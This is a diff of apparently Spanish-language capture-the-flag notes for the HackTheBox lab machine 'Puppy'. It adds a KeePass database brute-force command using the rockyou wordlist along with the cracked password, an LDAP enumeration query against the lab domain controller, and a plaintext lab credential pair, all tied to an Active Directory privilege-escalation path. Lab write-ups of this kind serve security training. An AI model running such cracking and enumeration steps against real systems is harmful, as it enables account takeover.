@@ -111,3 +111,14 @@ ILY2025!
 - **ANT.EDWARDS** es miembro del grupo **SENIOR DEVS**.
     
 - El grupo **SENIOR DEVS** tiene permiso **GenericAll** sobre el usuario **ADAM.SILVER**.
+
+./keepass4brute.sh ../recovery.kdbx /usr/share/wordlists/rockyou.txt  
+liverpool
+
+
+```bash
+ldapsearch -x -H ldap://10.10.11.70 -D "ANT.EDWARDS@PUPPY.HTB" -W -b "DC=puppy,DC=htb" "(sAMAccountName=ADAM.SILVER)"   
+```
+
+
+steph.cooper:ChefSteph2025!
